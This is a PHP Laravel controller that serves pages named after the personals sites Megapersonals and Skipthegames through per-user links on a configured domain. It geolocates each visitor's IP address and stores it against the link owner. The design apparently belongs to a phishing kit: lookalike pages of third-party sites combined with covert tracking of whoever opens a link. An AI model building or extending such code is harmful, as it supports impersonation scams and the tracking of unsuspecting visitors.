<?php

namespace App\Http\Controllers;

use App\Enums\AccountTypes;
use App\Models\AccountType;
use App\Models\LinkDomain;
use App\Models\User;
use App\Services\LinkInfoService;
use Illuminate\Support\Str;
use Stevebauman\Location\Facades\Location;

class ViewPageController extends Controller
{
    public function __construct(protected LinkInfoService $linkInfoService){}

    public function __invoke(User $user)
    {
        $currentUrl = url()->current();

        $endpoint = Str::after($currentUrl, url('/'));
        $endpoint = Str::before($endpoint, "/$user->id");

        $linkDomain = LinkDomain::whereDomain(env('APP_DOMAIN'))->whereEndpoint($endpoint)->first();
        abort_if(!$linkDomain, 404);

        $type = AccountType::find($linkDomain->type);
        $location_info = Location::get(request()->ip());
        // $location_info = Location::get();

        if($location_info){
            $this->linkInfoService->create((array) $location_info, $user->id);
        }

        switch ($type->name) {
            case AccountTypes::MEGAPERSONALS->value:
                return view('megapersonals', [
                    'type_id' => $type->id,
                    'user_id' => $user->id
                ]);
            case AccountTypes::SKIPTHEGAMES->value:
                return view('skipthegames', [
                    'type_id' => $type->id,
                    'user_id' => $user->id
                ]);
            default:
                abort(404);
        }
    }
}
